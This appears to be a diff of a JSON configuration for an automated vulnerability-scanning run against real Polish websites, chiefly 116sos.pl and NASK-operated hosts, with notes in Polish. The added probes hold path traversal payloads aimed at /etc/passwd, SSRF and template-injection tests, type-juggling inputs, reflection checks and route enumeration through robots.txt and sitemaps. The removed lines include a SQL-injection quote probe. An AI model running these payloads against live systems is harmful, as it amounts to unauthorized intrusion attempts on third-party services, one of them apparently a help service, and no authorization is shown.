@@ -1,98 +1,153 @@
 {
-  "run": "011",
-  "note": "116sos.pl WROCIL (byl 502 przez noc) i ma endpointy, ktorych nikt nie rozstrzygnal: /api/fetch-cookie-hash zwraca cookieHash bez uwierzytelnienia, /api/centres-search 13 KB JSON. Plus mapa API dyzurnet i dns, ktorej nikt nie zrobil. GET, read-only, bez kont, bez parametrow modyfikujacych.",
+  "run": "012",
+  "note": "Trzy leady z runu 011 zamkniete TWARDO (identyczny sha256 przy roznych wejsciach): cookie-hash staly 31345c45 w trzech zadaniach, centres-search 13306 B a30131e2 przy ?q ?limit ?city' - endpoint ignoruje parametry, wiec brak powierzchni injection i brak enumeracji. Teraz nowa powierzchnia: dynamiczny generator OG (klasa najbardziej podatna: SSRF/LFI/wstrzykniecie), mapa API dyzurnet (przypisana nam, nikt nie zrobil), trasy ujawnione w pages[] przez /api/announcements, oraz tresc robots.txt (dotad tylko status).",
   "probes": [
     {
-      "id": "sos-root",
-      "url": "https://116sos.pl/",
-      "note": "kontrola: host zyje po awarii 502; zapisac naglowki (ACAO, Set-Cookie - tylko nazwy)",
+      "id": "og-baseline-1",
+      "url": "https://116sos.pl/api/og-image?imageId=1",
+      "note": "kontrola: znamy 200 image/jpeg 16264 B sha 3aff4e21. Powtorka dla porownania w TYM przebiegu",
       "snippet": false
     },
     {
-      "id": "sos-cookie-hash-1",
-      "url": "https://116sos.pl/api/fetch-cookie-hash",
-      "note": "pomiar 1: czy cookieHash jest zwracany bez uwierzytelnienia i bez ciasteczka",
-      "snippet": true
+      "id": "og-id-2",
+      "url": "https://116sos.pl/api/og-image?imageId=2",
+      "note": "czy imageId cokolwiek selekcjonuje (inny sha = ID ma znaczenie i jest enumerowalne)"
     },
     {
-      "id": "sos-cookie-hash-2",
-      "url": "https://116sos.pl/api/fetch-cookie-hash",
-      "note": "pomiar 2 (ten sam URL, inne zadanie): jesli hash jest STALY miedzy zadaniami bez ciasteczka, to stala wartosc serwerowa - bez wplywu, zamykamy",
-      "snippet": true
+      "id": "og-id-0",
+      "url": "https://116sos.pl/api/og-image?imageId=0",
+      "note": "granica dolna: 0 vs 1"
     },
     {
-      "id": "sos-cookie-hash-with-cookie",
-      "url": "https://116sos.pl/api/fetch-cookie-hash",
-      "headers": { "Cookie": "stickounet=zzqx9probe1" },
-      "note": "pomiar 3: czy hash jest pochodna NASZEGO ciasteczka (wtedy to funkcja, nie wyciek). Porownanie trzech prob rozstrzyga sprawe",
-      "snippet": true
+      "id": "og-id-neg",
+      "url": "https://116sos.pl/api/og-image?imageId=-1",
+      "note": "wartosc ujemna: czy walidacja liczbowa istnieje"
     },
     {
-      "id": "sos-centres-control",
-      "url": "https://116sos.pl/api/centres-search",
-      "note": "kontrola: 13 KB JSON z adresami placowek pomocy - sprawdzic SCHEMAT KLUCZY, czy sa pola osobowe",
-      "snippet": true
+      "id": "og-id-huge",
+      "url": "https://116sos.pl/api/og-image?imageId=999999999",
+      "note": "poza zakresem: czy blad ujawnia stack trace albo inny typ odpowiedzi"
     },
     {
-      "id": "sos-centres-q",
-      "url": "https://116sos.pl/api/centres-search?q=Warszawa",
-      "note": "czy endpoint przyjmuje filtr tekstowy (potencjalna powierzchnia injection, tylko odczyt)"
+      "id": "og-id-nonnum",
+      "url": "https://116sos.pl/api/og-image?imageId=abc",
+      "note": "typ niebedacy liczba: tresc bledu = informacja o parserze/stacku"
     },
     {
-      "id": "sos-centres-limit",
-      "url": "https://116sos.pl/api/centres-search?limit=1000",
-      "note": "czy parametr limit jest honorowany (masowy odczyt) - sprawdzic czy rozmiar rosnie"
+      "id": "og-id-empty",
+      "url": "https://116sos.pl/api/og-image",
+      "note": "brak parametru: zachowanie domyslne"
     },
     {
-      "id": "sos-centres-inject",
-      "url": "https://116sos.pl/api/centres-search?city=Warszawa'",
-      "note": "pojedynczy apostrof w parametrze: minimalna sonda bledu SQL, tylko odczyt. WAF moze uciac polaczenie - to tez wynik"
+      "id": "og-traversal",
+      "url": "https://116sos.pl/api/og-image?imageId=../../../../etc/passwd",
+      "note": "klasa LFI: czy imageId jest sklejane w sciezke pliku. Tylko odczyt, cel nieszkodliwy"
     },
     {
-      "id": "sos-announcements",
-      "url": "https://116sos.pl/api/announcements",
-      "note": "endpoint wracal 502; teraz sprawdzic realna odpowiedz i schemat",
-      "snippet": true
+      "id": "og-traversal-enc",
+      "url": "https://116sos.pl/api/og-image?imageId=..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "note": "klasa LFI wariant zakodowany: rozstrzyga, czy dekodowanie procentow ma miejsce PRZED walidacja"
     },
     {
-      "id": "sos-og-image",
-      "url": "https://116sos.pl/api/og-image?imageId=1",
-      "note": "generator obrazkow po imageId - sprawdzic, czy parametr jest numeryczny i co zwraca"
+      "id": "og-array",
+      "url": "https://116sos.pl/api/og-image?imageId[]=1",
+      "note": "type juggling: czy framework przyjmie tablice tam, gdzie oczekuje skalaru (PHP/qs)"
     },
     {
-      "id": "dyz-api-root",
-      "url": "https://dyzurnet.pl/api/",
-      "note": "dyzurnet: /api/ zwracalo 308 -> /api i 200 HTML. Sprawdzic, czy istnieje realny korzen API (mapy nikt nie zrobil)"
+      "id": "og-ssrf-url",
+      "url": "https://116sos.pl/api/og-image?imageId=1&url=https://example.com/",
+      "note": "powierzchnia SSRF: czy generator pobiera zdalny zasob. Rozstrzyga zmiana sha/rozmiaru vs baseline"
     },
     {
-      "id": "dyz-api-zgloszenia",
-      "url": "https://dyzurnet.pl/api/zgloszenia/",
-      "note": "dyzurnet: domniemana trasa zgloszen incydentow"
+      "id": "og-title-reflect",
+      "url": "https://116sos.pl/api/og-image?imageId=1&title=zzqx9probe",
+      "reflect": "zzqx9probe",
+      "note": "czy dowolny tekst trafia do renderu (potencjalne wstrzykniecie znacznikow do szablonu HTML/SVG przed rasteryzacja)"
     },
     {
-      "id": "dyz-api-robots",
+      "id": "dyz-zgloszenia",
+      "url": "https://dyzurnet.pl/api/zgloszenia",
+      "note": "TRASA REALNA? run011: /api/zgloszenia/ -> 308 na /api/zgloszenia. Teraz bez ukosnika: rozstrzyga API vs soft-404"
+    },
+    {
+      "id": "dyz-api-json",
+      "url": "https://dyzurnet.pl/api",
+      "note": "cel przekierowania z runu 011 (/api/ -> /api): czy to API czy strona HTML"
+    },
+    {
+      "id": "dyz-robots-body",
       "url": "https://dyzurnet.pl/robots.txt",
-      "note": "dyzurnet: robots.txt czesto ujawnia realne sciezki API panelu"
+      "snippet": true,
+      "note": "81 B: tresc ujawnia realne trasy (dotad mielismy tylko status 200)"
     },
     {
-      "id": "dns-robots",
-      "url": "https://dns.pl/robots.txt",
-      "note": "dns.pl: robots.txt - mapa realnych tras (te z bundle'a okazaly sie martwe)"
+      "id": "dyz-sitemap",
+      "url": "https://dyzurnet.pl/sitemap.xml",
+      "note": "sitemap: zbior tras, ktory nikt nie pobral na tym hoscie"
     },
     {
-      "id": "sci-robots",
-      "url": "https://science.nask.pl/robots.txt",
-      "note": "science: robots.txt - czy wskazuje inne sitemapy/sekcje niz znamy"
-    },
-    {
-      "id": "oad-robots",
-      "url": "https://oad.nask.pl/robots.txt",
-      "note": "oad: robots.txt"
-    },
-    {
-      "id": "zglos-robots",
+      "id": "zglos-robots-body",
       "url": "https://zglos-dezinformacje.nask.pl/robots.txt",
-      "note": "zglos: robots.txt"
+      "snippet": true,
+      "note": "81 B: tresc. Jesli Disallow wskazuje /admin lub /api/internal, to mapa tras, ktorej nie ma w zadnym raporcie"
+    },
+    {
+      "id": "zglos-sitemap",
+      "url": "https://zglos-deinformacje.nask.pl/sitemap.xml",
+      "note": "sitemap serwisu zgloszen"
+    },
+    {
+      "id": "sci-robots-body",
+      "url": "https://science.nask.pl/robots.txt",
+      "snippet": true,
+      "note": "73 B: tresc (dotad tylko status)"
+    },
+    {
+      "id": "sci-sitemap",
+      "url": "https://science.nask.pl/sitemap.xml",
+      "note": "sitemap science: realne sekcje, w tym byc moze te z WordPressa"
+    },
+    {
+      "id": "sos-dodaj",
+      "url": "https://116sos.pl/osrodki-pomocowe/dodaj",
+      "note": "trasa z pages[] w /api/announcements: PUBLICZNY formularz dodawania osrodka. GET ujawnia bundle i docelowy endpoint API (pasywnie, bez POST)"
+    },
+    {
+      "id": "sos-dokumenty",
+      "url": "https://116sos.pl/dokumenty",
+      "note": "trasa z pages[]: lista dokumentow - byc moze identyfikatory plikow do sprawdzenia pozniej"
+    },
+    {
+      "id": "sos-artykuly-tag",
+      "url": "https://116sos.pl/artykuly/tag/zzqx9probe",
+      "reflect": "zzqx9probe",
+      "note": "dynamiczny segment trasy: czy tag jest odbijany w HTML (refleksja) i czy w SPA shell"
+    },
+    {
+      "id": "sos-artykuly-autor",
+      "url": "https://116sos.pl/artykuly/autor/zzqx9probe",
+      "reflect": "zzqx9probe",
+      "note": "drugi dynamiczny segment: autor"
+    },
+    {
+      "id": "sos-cookie-hash-cookie-a",
+      "url": "https://116sos.pl/api/fetch-cookie-hash",
+      "cookie": "stickounet=zzqx9probeA",
+      "snippet": true,
+      "note": "KONTROLA POPRAWNA (run011 mial blad: naglowek Cookie nie byl wysylany, bo narzedzie czytalo tylko Origin). Teraz pole 'cookie' jest realnie stosowane"
+    },
+    {
+      "id": "sos-cookie-hash-cookie-b",
+      "url": "https://116sos.pl/api/fetch-cookie-hash",
+      "cookie": "stickounet=zzqx9probeB; inna=wartosc",
+      "snippet": true,
+      "note": "druga rozna wartosc ciasteczka: jesli sha nadal 31345c45, hash jest STALY i niezalezny od klienta - lead zamkniety definitywnie"
+    },
+    {
+      "id": "sos-module-header",
+      "url": "https://116sos.pl/api/announcements",
+      "headers": { "Origin": "https://116sos.pl" },
+      "note": "kontrola CORS: czy ACAO odbija Origin na endpoincie JSON (dotad ACAO bylo stale na info-trace.116sos.pl)"
     }
   ]
 }
